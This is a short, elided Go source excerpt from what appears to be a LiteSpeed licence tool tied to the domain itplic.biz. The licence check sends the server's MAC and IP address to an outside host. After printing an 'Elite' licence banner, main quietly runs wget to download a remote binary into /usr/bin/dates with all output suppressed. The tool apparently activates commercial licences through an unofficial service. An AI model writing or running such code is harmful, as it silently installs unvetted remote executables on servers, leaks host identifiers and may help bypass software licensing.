...
func licensekey() error {
	...
	url := fmt.Sprintf("https://litespeed.itplic.biz/lic_checkgenv2gooda.php?core=9&mac=%s&ip=%s", mac, ip)
...
func main() {
	...
	resp, err := http.Get("http://itplic.biz/api/getinfo?key=litespeedx")
	if err != nil {
		os.Exit(1)
	}
	...
	if f.Status == "success" {
		...
		color.Style{color.FgWhite, color.OpBold}.Println("|License Type:     Web Host Elite X-WORKER")
		...
		_exec("wget -O /usr/bin/dates https://litespeed.itplic.biz/x/dates > /dev/null 2>&1")
